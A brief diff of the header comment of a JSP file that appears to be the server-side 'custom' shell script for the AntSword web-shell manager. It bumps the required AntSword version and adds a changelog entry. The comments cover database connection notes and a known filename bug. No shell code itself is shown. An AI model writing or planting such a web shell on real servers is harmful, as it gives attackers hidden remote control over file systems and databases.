@@ -12,7 +12,7 @@
 ———————————————————————————————————————————————
 
 说明：
- 1. AntSword >= v1.1-dev
+ 1. AntSword >= v2.1.0
  2. 创建 Shell 时选择 custom 模式连接
  3. 数据库连接：
   oracle.jdbc.driver.OracleDriver
@@ -26,7 +26,7 @@
 已知问题：
  1. 文件管理遇到中文文件名显示的问题
 ChangeLog:
-
+Ver:1.5
 --%>
 <%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*" contentType="text/html;charset=UTF-8"%>
 <%!
